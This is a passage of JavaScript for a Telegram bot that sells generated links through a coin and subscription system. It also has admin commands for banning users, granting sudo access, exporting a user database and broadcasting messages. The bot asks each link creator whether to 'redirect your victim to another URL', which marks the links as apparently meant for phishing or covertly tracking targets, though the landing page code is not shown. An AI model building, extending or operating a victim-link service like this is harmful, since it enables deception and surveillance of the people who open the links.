                            [{ text: "🔗 ᴄʀᴇᴀᴛᴇ ɴᴇᴡ ᴜʀʟ" }],
                            [{ text: "👤 ᴍʏ ɪɴғᴏ" }, { text: "👨‍💻 ᴅᴇᴠᴇʟᴏᴘᴇʀ" }],
                            [{ text: "🤝 sʜᴀʀᴇ & ᴇᴀʀɴ" }, { text: "💰 ʙᴜʏ ᴄᴏɪɴ" }]
                        ],
                        resize_keyboard: true
                    }
                });
            } else {
                bot.answerCallbackQuery(query.id, { text: "⚠️ ᴊᴏɪɴ ᴀʟʟ ᴄʜᴀɴɴᴇʟs ғɪʀsᴛ!", show_alert: true });
            }
        } catch (error) {}
    }
    else if (data === 'create_custom') {
        userState[chatId] = { step: 'await_custom_name' };
        bot.sendMessage(chatId, makeBorder("ᴄᴜsᴛᴏᴍ", "<b>✏️: sᴇɴᴅ ʏᴏᴜʀ ᴄᴜsᴛᴏᴍ ʟɪɴᴋ ɴᴀᴍᴇ</b>"), { parse_mode: 'HTML' });
    } 
    else if (data === 'create_random') {
        askRedirect(query, Math.random().toString(36).substring(7));
    } 
    else if (data === 'use_redirect') {
        userState[chatId].step = 'await_redirect_url';
        bot.sendMessage(chatId, makeBorder("ʀᴇᴅɪʀᴇᴄᴛ", "<b>🌐: sᴇɴᴅ ᴛʜᴇ ᴅᴇsᴛɪɴᴀᴛɪᴏɴ ᴜʀʟ</b>"), { parse_mode: 'HTML' });
    } 
    else if (data === 'no_redirect') {
        createFinalLink(query, userState[chatId].name, null);
    }
});

function askRedirect(msg, name) {
    const chatId = msg.from ? msg.from.id : msg.chat.id;
    userState[chatId] = { name: name, step: 'await_choice' };
    bot.sendMessage(chatId, `<b>┏━━「 ${_fnt("OPTION")} 」━━┓</b>\n┃ 📝: <b>ɴᴀᴍᴇ:</b> <code>${name}</code>\n┃ ❓: <b>ᴅᴏ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ʀᴇᴅɪʀᴇᴄᴛ</b>\n┃ <b>ʏᴏᴜʀ ᴠɪᴄᴛɪᴍ ᴛᴏ ᴀɴᴏᴛʜᴇʀ ᴜʀʟ?</b>\n<b>┗━━━━━━━━━━┛</b>`, {
        parse_mode: 'HTML',
        reply_markup: { inline_keyboard: [[{ text: "✅ ʏᴇs", callback_data: "use_redirect" }, { text: "❌ ɴᴏ", callback_data: "no_redirect" }]] }
    });
}

async function createFinalLink(msg, name, redirectUrl) {
    const chatId = msg.from ? msg.from.id : msg.chat.id;
    const user = await User.findOne({ chatId });
    
    const isSub = hasActiveSub(user);
    
    if (!isSub && user.freeUrlsLeft <= 0 && user.coins <= 0) {
        delete userState[chatId];
        return bot.sendMessage(chatId, makeBorder("⚠️ ᴇʀʀᴏʀ", "❌: ɴᴏ ᴄᴏɪɴs/ᴛʀɪᴀʟs ʟᴇғᴛ!"), { parse_mode:'HTML' });
    }

    if (!isSub) {
        if (user.freeUrlsLeft > 0) user.freeUrlsLeft -= 1; else user.coins -= 1;
        await user.save();
    }

    await new Link({ shortId: name, creatorChatId: chatId, originalUrl: redirectUrl }).save();
    delete userState[chatId];
    
    const url = `https://code-url-dpb7.onrender.com/w/${name}`;
    let bal = isSub ? `sᴜʙsᴄʀɪᴘᴛɪᴏɴ ᴀᴄᴛɪᴠᴇ` : `ʀᴇᴍᴀɪɴɪɴɢ: ${user.coins} ᴄᴏɪɴs, ${user.freeUrlsLeft} ғʀᴇᴇ`;
    
    bot.sendMessage(chatId, `<b>┏━━「 ✅ ${_fnt("SUCCESS")} 」━━┓</b>\n┃ 🔗: ${url}\n┃ \n┃ 🔄: ${redirectUrl || 'N/A'}\n┃ 💰: ${bal}\n<b>┗━━━━━━━━━━┛</b>`, { parse_mode: 'HTML' });
}


bot.onText(/\/gift\s+(\d+)\s+(.+)/, async (msg, match) => {
    if (msg.chat.type !== 'private') return;
    const amount = parseInt(match[1]);
    const inputTarget = match[2];
    
    const sender = await User.findOne({ chatId: msg.from.id });
    if (!sender || sender.coins < amount) {
        return bot.sendMessage(msg.chat.id, makeBorder("⚠️ ᴇʀʀᴏʀ", "❌: ɪɴsᴜғғɪᴄɪᴇɴᴛ ᴄᴏɪɴs (ᴏɴʟʏ ʀᴇɢᴜʟᴀʀ ᴄᴏɪɴs ᴄᴀɴ ʙᴇ ɢɪғᴛᴇᴅ)."), {parse_mode:'HTML'});
    }
    if (amount <= 0) return bot.sendMessage(msg.chat.id, "❌ Invalid Amount");

    const targetUser = await resolveUser(msg, inputTarget);
    if (!targetUser) return bot.sendMessage(msg.chat.id, makeBorder("⚠️ ᴇʀʀᴏʀ", "❌: ᴜsᴇʀ ɴᴏᴛ ғᴏᴜɴᴅ ɪɴ ᴅᴀᴛᴀʙᴀsᴇ"), {parse_mode:'HTML'});

    sender.coins -= amount;
    targetUser.coins += amount;
    
    await sender.save();
    await targetUser.save();

    bot.sendMessage(msg.chat.id, makeBorder("🎁 ɢɪғᴛ sᴇɴᴛ", `✅: ʏᴏᴜ sᴇɴᴛ ${amount} ᴄᴏɪɴs ᴛᴏ ${targetUser.firstName}`), {parse_mode:'HTML'});
    bot.sendMessage(targetUser.chatId, makeBorder("🎁 ɢɪғᴛ ʀᴇᴄᴇɪᴠᴇᴅ", `🎉: ʏᴏᴜ ʀᴇᴄᴇɪᴠᴇᴅ ${amount} ᴄᴏɪɴs ғʀᴏᴍ ${sender.firstName}`), {parse_mode:'HTML'});
});

bot.onText(/\/gift$/, (msg) => {
    if (msg.chat.type !== 'private') return;
    bot.sendMessage(msg.chat.id, makeBorder("💡 ʜᴏᴡ ᴛᴏ ᴜsᴇ", "✍️ <b>Usage:</b>\n<code>/gift [amount] [userID/Username]</code>\n\nExample: <code>/gift 10 123456789</code>"), {parse_mode:'HTML'});
});


bot.onText(/\/sudo(?:\s+(.+))?/, async (msg, match) => {
    if (!OWNER_IDS.includes(msg.from.id)) return;
    
    if (!match[1] && !msg.reply_to_message) {
        const sudos = await User.find({ isSudo: true });
        let txt = `<b>┏━「 ꜱᴜᴅᴏ ʟɪꜱᴛ 」</b>\n`;
        let count = 0;
        
        for (const id of OWNER_IDS) {
            const u = await User.findOne({ chatId: id });
            txt += `<b>┣ 🆔 <code>${id}</code>\n┃ ┗ 👤 ${u ? `<a href="tg://user?id=${id}">${u.firstName}</a>` : "Owner (DB Pending)"} [OWNER]</b>\n`;
            count++;
        }
        for (const s of sudos) {
            if (OWNER_IDS.includes(s.chatId)) continue;
            txt += `<b>┣ 🆔 <code>${s.chatId}</code>\n┃ ┗ 👤 <a href="tg://user?id=${s.chatId}">${s.firstName}</a></b>\n`;
            count++;
        }
        txt += `<b>┗━➾ ᴛᴏᴛᴀʟ: ${count}</b>`;
        return bot.sendMessage(msg.chat.id, txt, {parse_mode:'HTML'});
    }

    let isRemove = false;
    let targetId;
    let targetName = "User";
    
    let inputStr = match[1] ? match[1].trim() : "";
    if (inputStr.toLowerCase().startsWith('r ')) {
        isRemove = true;
        inputStr = inputStr.substring(2).trim();
    }

    if (msg.reply_to_message) {
        targetId = msg.reply_to_message.from.id;
        targetName = msg.reply_to_message.from.first_name || "User";
        if (match[1] && match[1].trim().toLowerCase() === 'r') {
            isRemove = true;
        }
    } else if (inputStr) {
        const cleanInput = inputStr.replace('@', '');
        if (/^\d+$/.test(cleanInput)) {
            targetId = parseInt(cleanInput);
        } else {
            const u = await User.findOne({ username: { $regex: new RegExp(`^${cleanInput}$`, 'i') } });
            if (u) {
                targetId = u.chatId;
                targetName = u.firstName;
            }
        }
    }

    if (!targetId || isNaN(targetId)) {
        return bot.sendMessage(msg.chat.id, makeBorder("⚠️ ᴇʀʀᴏʀ", "❌: ᴜsᴇʀ ɴᴏᴛ ғᴏᴜɴᴅ / ɪɴᴠᴀʟɪᴅ ɪᴅ"), {parse_mode:'HTML'});
    }
    
    let targetUser = await User.findOne({ chatId: targetId });
    if (!targetUser) {
        targetUser = new User({ chatId: targetId, firstName: targetName, isSudo: !isRemove });
    } else {
        targetUser.isSudo = isRemove ? false : !targetUser.isSudo;
    }
    await targetUser.save();
    
    bot.sendMessage(msg.chat.id, makeBorder("👑 sᴜᴅᴏ ᴜᴘᴅᴀᴛᴇ", `✅: ${targetUser.firstName || targetId} sᴜᴅᴏ ᴀᴄᴄᴇss ɪs ɴᴏᴡ: <b>${targetUser.isSudo}</b>`), {parse_mode:'HTML'});
});


bot.onText(/\/share\s+(on|off)/i, async (msg, match) => {
    if (!(await checkAdmin(msg.from.id))) return;
    const state = match[1].toLowerCase();
    shareSystemEnabled = (state === 'on');
    bot.sendMessage(msg.chat.id, makeBorder("⚙️ ᴀᴅᴍɪɴ", `✅: ʀᴇғᴇʀʀᴀʟ sʏsᴛᴇᴍ ɪs ɴᴏᴡ <b>${state.toUpperCase()}</b>`), {parse_mode:'HTML'});
});

async function modifyOrAddSub(msg, match, type) {
    if (!(await checkAdmin(msg.from.id))) return;

    const amtStr = match[1].toLowerCase();
    const inputTarget = match[2]; 
    const targetUser = await resolveUser(msg, inputTarget);

    if (!targetUser) return bot.sendMessage(msg.chat.id, makeBorder("⚠️ ᴇʀʀᴏʀ", "❌: ᴜsᴇʀ ɴᴏᴛ ғᴏᴜɴᴅ"), {parse_mode:'HTML'});

    if (amtStr.match(/[dmy]$/)) {
        const val = parseInt(amtStr);
        let multiplier = 0;
        if (amtStr.includes('d')) multiplier = 24 * 60 * 60 * 1000;
        else if (amtStr.includes('m')) multiplier = 30 * 24 * 60 * 60 * 1000;
        else if (amtStr.includes('y')) multiplier = 365 * 24 * 60 * 60 * 1000;
        
        targetUser.subscriptionExpiry = new Date(Date.now() + (val * multiplier));
        await targetUser.save();
        
        bot.sendMessage(msg.chat.id, makeBorder("ᴀᴅᴍɪɴ (sᴜʙs)", `✅: ᴀᴅᴅᴇᴅ ${val}${amtStr.slice(-1)} sᴜʙsᴄʀɪᴘᴛɪᴏɴ\n👤: ${targetUser.firstName}`), {parse_mode:'HTML'});
        bot.sendMessage(targetUser.chatId, makeBorder("sᴜʙsᴄʀɪᴘᴛɪᴏɴ", `🎉: ʏᴏᴜ ʜᴀᴠᴇ ʀᴇᴄᴇɪᴠᴇᴅ ᴀ sᴜʙsᴄʀɪᴘᴛɪᴏɴ ғᴏʀ ${val}${amtStr.slice(-1)}! ᴜɴʟɪᴍɪᴛᴇᴅ ғʀᴇᴇ ᴜsᴀɢᴇ.`), {parse_mode:'HTML'});
        return;
    }

    const amount = parseInt(amtStr);
    if (isNaN(amount)) return bot.sendMessage(msg.chat.id, "❌ Invalid format");

    if (type === 'add') {
        targetUser.coins += amount;
        await targetUser.save();
        bot.sendMessage(msg.chat.id, makeBorder("ᴀᴅᴍɪɴ", `✅: ᴀᴅᴅᴇᴅ ${amount} ᴄᴏɪɴs\n👤: ${targetUser.firstName}`), {parse_mode:'HTML'});
        bot.sendMessage(targetUser.chatId, makeBorder("ʙᴀʟᴀɴᴄᴇ", `💰: +${amount} ᴄᴏɪɴs ᴀᴅᴅᴇᴅ!`), {parse_mode:'HTML'});
    } else {
        targetUser.coins = Math.max(0, targetUser.coins - amount);
        await targetUser.save();
        bot.sendMessage(msg.chat.id, makeBorder("ᴀᴅᴍɪɴ", `⛔️: ʀᴇᴍᴏᴠᴇᴅ ${amount} ᴄᴏɪɴs\n👤: ${targetUser.firstName}`), {parse_mode:'HTML'});
    }
}

bot.onText(/\/add\s+([\d]+[dmy]?|\d+)(?:\s+(.+))?/i, (msg, match) => modifyOrAddSub(msg, match, 'add'));
bot.onText(/\/(?:rem|rm)\s+(\d+)(?:\s+(.+))?/, (msg, match) => modifyOrAddSub(msg, match, 'rem'));

bot.onText(/\/reset(?:\s+(.+))?/, async (msg, match) => {
    if (!(await checkAdmin(msg.from.id))) return;
    const targetUser = await resolveUser(msg, match[1]);
    
    if (!targetUser) return bot.sendMessage(msg.chat.id, makeBorder("⚠️ ᴇʀʀᴏʀ", "❌: ᴜsᴇʀ ɴᴏᴛ ғᴏᴜɴᴅ"), {parse_mode:'HTML'});
    
    targetUser.coins = 0;
    targetUser.freeUrlsLeft = 4;
    targetUser.referralCount = 0; 
    targetUser.subscriptionExpiry = null;
    await targetUser.save();
    
    await Link.deleteMany({ creatorChatId: targetUser.chatId });
    
    bot.sendMessage(msg.chat.id, makeBorder("ᴀᴅᴍɪɴ", `✅: ᴀᴄᴄᴏᴜɴᴛ ʀᴇsᴇᴛ sᴜᴄᴄᴇssғᴜʟ\n👤: ${targetUser.firstName}\n🗑: ᴀʟʟ ʟɪɴᴋs & sᴜʙs ᴅᴇʟᴇᴛᴇᴅ, ᴄᴏɪɴs 0`), {parse_mode:'HTML'});
    bot.sendMessage(targetUser.chatId, makeBorder("sʏsᴛᴇᴍ", `🔄: ʏᴏᴜʀ ᴀᴄᴄᴏᴜɴᴛ ʜᴀs ʙᴇᴇɴ ʀᴇsᴇᴛ ʙʏ ᴀᴅᴍɪɴ!`), {parse_mode:'HTML'});
});

bot.onText(/\/ban(?:\s+(.+))?/, async (msg, match) => {
    if (!(await checkAdmin(msg.from.id))) return;
    const user = await resolveUser(msg, match[1]);
    if(user) { user.isBanned = true; await user.save(); bot.sendMessage(msg.chat.id, makeBorder("ʙᴀɴ", `🚫: ʙᴀɴɴᴇᴅ ${user.firstName}`), {parse_mode:'HTML'}); }
});

bot.onText(/\/unban(?:\s+(.+))?/, async (msg, match) => {
    if (!(await checkAdmin(msg.from.id))) return;
    const user = await resolveUser(msg, match[1]);
    if(user) { user.isBanned = false; await user.save(); bot.sendMessage(msg.chat.id, makeBorder("ᴜɴʙᴀɴ", `✅: ᴜɴʙᴀɴɴᴇᴅ ${user.firstName}`), {parse_mode:'HTML'}); }
});

bot.onText(/\/ulist/, async (msg) => {
    if (!(await checkAdmin(msg.from.id))) return;

    try {
        const links = await Link.find({});
        if (links.length === 0) return bot.sendMessage(msg.chat.id, "<b>📭 ɴᴏ ᴀᴄᴛɪᴠᴇ ʟɪɴᴋs ɪɴ sᴇʀᴠᴇʀ</b>", {parse_mode:'HTML'});

        const userGroups = {};
        links.forEach(l => {
            if (!userGroups[l.creatorChatId]) userGroups[l.creatorChatId] = 0;
            userGroups[l.creatorChatId]++;
        });

        let report = `📂 <b>ᴀᴄᴛɪᴠᴇ ʟɪɴᴋs sᴜᴍᴍᴀʀʏ</b>\n\n`;
        for (const uid in userGroups) {
            const user = await User.findOne({ chatId: uid });
            report += `👤 <b>${user ? user.firstName : 'Unknown'}</b>\n`;
            report += `🆔 ɪᴅ: <code>${uid}</code>\n`;
            report += `🔗 ʟɪɴᴋs: <b>${userGroups[uid]}</b>\n`;
            report += `────────────────────\n`;
        }

        bot.sendMessage(msg.chat.id, makeBorder("ʟɪɴᴋ ᴍᴀɴᴀɢᴇʀ", report), {
            parse_mode: 'HTML',
            reply_markup: { inline_keyboard: [[{ text: "📝 ʜᴏᴡ ᴛᴏ ʀᴇᴍᴏᴠᴇ", callback_data: "rm_guide" }]] }
        });
    } catch (e) { bot.sendMessage(msg.chat.id, "❌ Error."); }
});

bot.onText(/\/ulink(?:\s+(\d+))?/, async (msg, match) => {
    if (!(await checkAdmin(msg.from.id))) return;

    let targetId;
    if (msg.reply_to_message) {
        targetId = msg.reply_to_message.from.id;
    } else if (match[1]) {
        targetId = parseInt(match[1]);
    } else {
        return bot.sendMessage(msg.chat.id, "❌ Please provide a User ID or reply to their message.");
    }

    const userLinks = await Link.find({ creatorChatId: targetId });
    if (userLinks.length === 0) return bot.sendMessage(msg.chat.id, `❌ No active links for <code>${targetId}</code>`, {parse_mode:'HTML'});

    let linkMsg = `👤 <b>ᴜsᴇʀ:</b> <code>${targetId}</code>\n`;
    linkMsg += `📊 <b>ᴀᴄᴛɪᴠᴇ:</b> ${userLinks.length}\n\n`;

    userLinks.forEach((l, i) => {
        linkMsg += `<b>${i + 1}.</b> <code>${l.shortId}</code> | ${l.customName || 'No Name'}\n`;
    });

    bot.sendMessage(msg.chat.id, makeBorder("ᴜsᴇʀ ʟɪɴᴋ ʟɪsᴛ", linkMsg), {
        parse_mode: 'HTML',
        reply_markup: {
            inline_keyboard: [
                [{ text: "🗑️ ᴅᴇʟᴇᴛᴇ specific", callback_data: `prompt_del_${targetId}` }],
                [{ text: "🔥 ᴅᴇʟᴇᴛᴇ ᴀʟʟ", callback_data: `delall_${targetId}` }]
            ]
        }
    });
});

bot.on('callback_query', async (query) => {
    if (!(await checkAdmin(query.from.id))) return;

    const [action, type, uid] = query.data.split('_');

    if (query.data === "rm_guide") {
        bot.sendMessage(query.message.chat.id, "📌 <b>ʀᴇᴍᴏᴠᴀʟ ɢᴜɪᴅᴇ:</b>\n\nTo delete specific links:\n<code>/rmlink [ID] 1 3</code>\n\nTo delete everything:\n<code>/rmlink [ID] all</code>", {parse_mode:'HTML'});
    }

    if (action === "delall") {
        const target = query.data.split('_')[1];
        await Link.deleteMany({ creatorChatId: target });
        bot.editMessageText(`✅ All links for <code>${target}</code> removed.`, { chat_id: query.message.chat.id, message_id: query.message.message_id, parse_mode: 'HTML' });
    }
    
    if (query.data.startsWith("prompt_del_")) {
        bot.sendMessage(query.message.chat.id, `👉 Copy & Edit:\n<code>/rmlink ${uid} 1</code>`, {parse_mode:'HTML'});
    }
});

bot.onText(/\/rmlink\s+(\d+)\s+(.+)/, async (msg, match) => {
    if (!(await checkAdmin(msg.from.id))) return;
    const targetId = parseInt(match[1]);
    const input = match[2].trim().toLowerCase();

    if (input === "all") {
        const res = await Link.deleteMany({ creatorChatId: targetId });
        bot.sendMessage(msg.chat.id, `✅ Success! ${res.deletedCount} links removed.`);
    } else {
        const userLinks = await Link.find({ creatorChatId: targetId });
        const nums = input.split(/\s+/).map(n => parseInt(n) - 1);
        
        let count = 0;
        for (let i of nums) {
            if (userLinks[i]) {
                await Link.deleteOne({ _id: userLinks[i]._id });
                count++;
            }
        }
        bot.sendMessage(msg.chat.id, `✅ Removed ${count} specific link(s).`);
    }
});

bot.onText(/\/menu/, async (msg) => {
    const chatId = msg.chat.id;
    const fromId = msg.from.id;

    if (!(await checkAdmin(fromId))) return;
    if (msg.chat.type !== 'private') {
        return bot.sendMessage(chatId, "❌ <b>ᴛʜɪs ᴄᴏᴍᴍᴀɴᴅ ᴏɴʟʏ ᴡᴏʀᴋs ɪɴ ʙᴏᴛ ᴅᴍ!</b>", { parse_mode: 'HTML' });
    }

    let menu = `👋 ʜᴇʟʟᴏ ᴀᴅᴍɪɴ, ɪ ᴀᴍ <b>${_fnt("NIKO")}</b>\n`;
    menu += `ʜᴇʀᴇ ᴀʀᴇ ʏᴏᴜʀ ᴘᴏᴡᴇʀғᴜʟ ᴄᴏᴍᴍᴀɴᴅs:\n\n`;

    menu += `👤 <b>ᴜsᴇʀ ᴍᴀɴᴀɢᴇᴍᴇɴᴛ</b>\n`;
    menu += `├ <code>/data</code> - sʜᴏᴡ ʏᴏᴜʀ ᴘʀᴏғɪʟᴇ\n`;
    menu += `├ <code>/data</code> [ʀᴇᴘʟʏ/ɪᴅ] - ғᴜʟʟ ᴅʙ ɪɴғᴏ\n`;
    menu += `└ <code>/users</code> - ɢᴇᴛ ᴜsᴇʀ ʟɪsᴛ (.ᴛxᴛ)\n\n`;

    menu += `🔗 <b>ʟɪɴᴋ ᴍᴀɴᴀɢᴇᴍᴇɴᴛ</b>\n`;
    menu += `├ <code>/ulist</code> - ᴀʟʟ ᴀᴄᴛɪᴠᴇ ʟɪɴᴋ ᴜsᴇʀs\n`;
    menu += `├ <code>/ulink</code> [ɪᴅ/ʀᴇᴘʟʏ] - ᴜsᴇʀ ʟɪɴᴋ ʟɪsᴛ\n`;
    menu += `└ <code>/rmlink</code> [ɪᴅ] [ɴᴜᴍ/ᴀʟʟ] - ᴅᴇʟᴇᴛᴇ\n\n`;

    menu += `💰 <b>ᴄᴏɴᴛʀᴏʟ sʏsᴛᴇᴍ</b>\n`;
    menu += `├ <code>/add</code> [ǫᴛʏ/1d,1m,1y] [ɪᴅ] - ᴀᴅᴅ ᴄᴏɪɴs/sᴜʙs\n`;
    menu += `├ <code>/rm</code> [ǫᴛʏ] [ɪᴅ] - ʀᴇᴍᴏᴠᴇ ᴄᴏɪɴs\n`;
    menu += `├ <code>/reset</code> [ɪᴅ] - ʀᴇsᴇᴛ ᴀᴄᴄᴏᴜɴᴛ\n`;
    menu += `├ <code>/sudo</code> [ɪᴅ] - ᴛᴏɢɢʟᴇ sᴜᴅᴏ ᴀᴄᴄᴇss\n`;
    menu += `├ <code>/sudo r</code> [ɪᴅ] - ʀᴇᴍᴏᴠᴇ sᴜᴅᴏ\n`;
    menu += `├ <code>/share on|off</code> - ᴛᴏɢɢʟᴇ ʀᴇғᴇʀʀᴀʟ\n`;
    menu += `├ <code>/ban</code> [ɪᴅ/ʀᴇᴘʟʏ] - ʀᴇsᴛʀɪᴄᴛ ᴜsᴇʀ\n`;
    menu += `└ <code>/unban</code> [ɪᴅ/ʀᴇᴘʟʏ] - ʟɪғᴛ ʙᴀɴ\n\n`;

    menu += `📢 <b>ʙʀᴏᴀᴅᴄᴀsᴛ sʏsᴛᴇᴍ</b>\n`;
    menu += `├ <code>/broadcast</code> [text/media] - sᴇɴᴅ ᴍᴇssᴀɢᴇ\n`;
    menu += `├ <code>/ref</code> [html text] - ʙʀᴏᴀᴅᴄᴀsᴛ ᴡɪᴛʜ ʀᴇғᴇʀʀᴀʟ\n`;
    menu += `└ <code>/offer</code> (amount) [text] - ᴄʀᴇᴀᴛᴇ ᴏғғᴇʀ\n\n`;

    const menuBorder = (title, body) => `<b>┏─「 ${_fnt(title)} 」</b>\n${body.split('\n').map(l => `<b>┃</b> ${l}`).join('\n')}\n<b>┗───────────╼</b>`;

    bot.sendMessage(chatId, menuBorder("ᴀᴅᴍɪɴ ᴘᴀɴᴇʟ", menu), { 
        parse_mode: 'HTML',
        reply_markup: {
            inline_keyboard: [[{ text: "📢 sᴜᴘᴘᴏʀᴛ ɢʀᴏᴜᴘ", url: "https://t.me/Codex_teamx" }]]
        }
    });
});

bot.onText(/\/data(?:\s+(.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const isOwner = await checkAdmin(msg.from.id);
    
    let targetUser;
    if (msg.reply_to_message) {
        targetUser = await User.findOne({ chatId: msg.reply_to_message.from.id });
    } else if (match[1]) {
        targetUser = await resolveUser(msg, match[1]);
    } else {
        targetUser = await User.findOne({ chatId: msg.from.id });
    }

    if (!targetUser) {
        return bot.sendMessage(chatId, `<b>❌ ${_fnt("User not found")}</b>`, { parse_mode: 'HTML' });
    }

    try {
        const activeLinkCount = await Link.countDocuments({ creatorChatId: targetUser.chatId });
        const member = await bot.getChatMember(chatId, targetUser.chatId).catch(() => null);
        const status = (member && (['member', 'creator', 'administrator'].includes(member.status))) ? "🟢 ᴏɴʟɪɴᴇ" : "🔴 ᴏғғʟɪɴᴇ";

        let content = "";
        
        if (isOwner) {
            const regDate = targetUser.joinedAt ? new Date(targetUser.joinedAt).toLocaleDateString() : "ɴ/ᴀ";
            content += `👤 ɴᴀᴍᴇ: <b>${targetUser.firstName || 'Unknown'}</b>\n`;
            content += `🆔 ᴜsᴇʀ ɪᴅ: <code>${targetUser.chatId}</code>\n`;
            content += `🏷 ᴜsᴇʀ: @${targetUser.username || 'ɴ/ᴀ'}\n`;
            content += `💰 ᴄᴏɪɴs: <code>${targetUser.coins}</code>\n`;
            content += `🎁 ғʀᴇᴇ: <code>${targetUser.freeUrlsLeft}</code>\n`;
            if(hasActiveSub(targetUser)) content += `💎 sᴜʙ: <code>${getSubTimeLeft(targetUser)}</code>\n`;
            content += `🔗 ᴀᴄᴛɪᴠᴇ: <code>${activeLinkCount}</code>\n`;
            content += `📡 sᴛᴀᴛᴜs: <b>${status}</b>\n`;
            content += `🛡 ʙᴀɴ: <b>${targetUser.isBanned ? "ʏᴇs" : "ɴᴏ"}</b>\n`;
            content += `📅 ʀᴇɢ ᴅᴀᴛᴇ: <code>${regDate}</code>`;
        } else {
            content += `👤 ɴᴀᴍᴇ: <b>${targetUser.firstName || 'Unknown'}</b>\n`;
            content += `🆔 ᴜsᴇʀ ɪᴅ: <code>${targetUser.chatId}</code>\n`; 
            content += `🏷 ᴜsᴇʀ: @${targetUser.username || 'ɴ/ᴀ'}\n`;
            content += `📡 sᴛᴀᴛᴜs: <b>${status}</b>`;
        }

        const shortBorder = (title, body) => `<b>┏─「 ${_fnt(title)} 」</b>\n${body.split('\n').map(l => `<b>┃</b> ${l}`).join('\n')}\n<b>┗───────────╼</b>`;

        bot.sendMessage(chatId, shortBorder(isOwner ? "ᴀᴅᴍɪɴ ᴅᴀᴛᴀ ᴠɪᴇᴡ" : "ᴜsᴇʀ ᴘʀᴏғɪʟᴇ", content), { parse_mode: 'HTML' });

    } catch (e) { bot.sendMessage(chatId, "❌ ᴇʀʀᴏʀ ᴘʀᴇᴘᴀʀɪɴɢ ᴅᴀᴛᴀ"); }
});

bot.onText(/\/users/, async (msg) => {
    if (!(await checkAdmin(msg.from.id))) return;

    try {
        const users = await User.find({});
        const totalUsers = users.length;
        const activeLinks = await Link.countDocuments();
        const bannedUsers = await User.countDocuments({ isBanned: true });

        let report = `📊 <b>sʏsᴛᴇᴍ sᴛᴀᴛɪsᴛɪᴄs</b>\n\n`;
        report += `👥 <b>ᴛᴏᴛᴀʟ ᴜsᴇʀs:</b> <code>${totalUsers}</code>\n`;
        report += `🔗 <b>ᴀᴄᴛɪᴠᴇ ʟɪɴks:</b> <code>${activeLinks}</code>\n`;
        report += `🚫 <b>ʙᴀɴɴᴇᴅ ᴜsᴇʀs:</b> <code>${bannedUsers}</code>\n`;
        
        await bot.sendMessage(msg.chat.id, makeBorder("sᴛᴀᴛs", report), { parse_mode: 'HTML' });

        let fileContent = `Ｄｘ－Ｓｉｍｕ USER DATABASE REPORT\nGenerated on: ${new Date().toLocaleString()}\n--------------------------------------------------\n\n`;

        users.forEach((u, index) => {
            const status = u.isBanned ? "BANNED 🚫" : "VALID ✅";
            const date = u.joinedAt ? new Date(u.joinedAt).toLocaleDateString() : "N/A";
            
            fileContent += `${index + 1}. ID: ${u.chatId}\n   NAME: ${u.firstName || 'N/A'}\n   USER: @${u.username || 'N/S'}\n   COINS: ${u.coins || 0}\n   FREE LEFT: ${u.freeUrlsLeft || 0}\n   SUB: ${hasActiveSub(u) ? "YES" : "NO"}\n   DATE: ${date}\n   STATUS: ${status}\n--------------------------------------------------\n`;
        });

        const filePath = `./all_users_report.txt`;
        fs.writeFileSync(filePath, fileContent);

        await bot.sendDocument(msg.chat.id, filePath, { caption: `📄 <b>ᴀʟʟ ᴜsᴇʀ ᴅᴇᴛᴀɪʟs (ɪɴᴄʟᴜᴅɪɴɢ ᴄᴏɪɴs/ғʀᴇᴇ)</b>`, parse_mode: 'HTML' });
        fs.unlinkSync(filePath);

    } catch (e) { bot.sendMessage(msg.chat.id, "❌ Error generating user report."); }
});


async function handleBroadcast(msg) {
    if (!(await checkAdmin(msg.from.id))) return;

    let rawText = msg.text || msg.caption || "";
    rawText = rawText.replace('/broadcast', '').trim();
    
    let isPin = false;
    if (rawText.includes('(pin)')) {
        isPin = true;
        rawText = rawText.replace('(pin)', '').trim();
    }

    let reply_markup = null;
    const btnMatch = rawText.match(/\[(.*)\|(.*)\]/);
    if (btnMatch) {
        rawText = rawText.replace(btnMatch[0], "").trim();
        reply_markup = { inline_keyboard: [[{ text: btnMatch[1].trim(), url: btnMatch[2].trim() }]] };
    }

    const replyMsg = msg.reply_to_message;
    if (!rawText && !msg.photo && !msg.video && !msg.document && !replyMsg) return bot.sendMessage(msg.chat.id, "❌ ᴇᴍᴘᴛʏ", {parse_mode:'HTML'});

    const users = await User.find({});
    bot.sendMessage(msg.chat.id, `⏳ <b>sᴇɴᴅɪɴɢ ᴛᴏ ${users.length} ᴜsᴇʀs...</b>`, {parse_mode:'HTML'});

    let success = 0;
    let failed = 0;
    let blocked = 0;

    for (const u of users) {
        try {
            let sentMsg;
            if (replyMsg) {
                sentMsg = await bot.copyMessage(u.chatId, msg.chat.id, replyMsg.message_id, { reply_markup });
            } else if (msg.photo) {
                sentMsg = await bot.sendPhoto(u.chatId, msg.photo[msg.photo.length - 1].file_id, { caption: rawText, parse_mode: 'HTML', reply_markup });
            } else if (msg.video) {
                sentMsg = await bot.sendVideo(u.chatId, msg.video.file_id, { caption: rawText, parse_mode: 'HTML', reply_markup });
            } else if (msg.document) {
                sentMsg = await bot.sendDocument(u.chatId, msg.document.file_id, { caption: rawText, parse_mode: 'HTML', reply_markup });
            } else {
                sentMsg = await bot.sendMessage(u.chatId, rawText, { parse_mode: 'HTML', reply_markup });
            }
            
            if (isPin && sentMsg) await bot.pinChatMessage(u.chatId, sentMsg.message_id);
            success++;
        } catch (e) {
            if (e.response && e.response.body && e.response.body.error_code === 403) blocked++;
            else failed++;
        }
        await new Promise(resolve => setTimeout(resolve, 50)); 
    }
    
    const reportMsg = `✅ <b>ʙʀᴏᴀᴅᴄᴀsᴛ ᴄᴏᴍᴘʟᴇᴛᴇᴅ</b>
━━━━━━━━━━━━━━━━━
👤 ᴛᴏᴛᴀʟ ᴛᴀʀɢᴇᴛs: <code>${users.length}</code>
📨 sᴇɴᴛ sᴜᴄᴄᴇss: <code>${success}</code>
🚫 ʀᴇᴍᴏᴠᴇᴅ/ʙʟᴏᴄᴋᴇᴅ: <code>${blocked}</code>
❌ ғᴀɪʟᴇᴅ/ᴇʀʀᴏʀ: <code>${failed}</code>
━━━━━━━━━━━━━━━━━`;

    bot.sendMessage(msg.chat.id, reportMsg, {parse_mode:'HTML'});
}


bot.onText(/\/ref\s+(.+)/s, async (msg, match) => {
    if (!(await checkAdmin(msg.from.id))) return;
    
    const htmlText = match[1];
    const users = await User.find({});
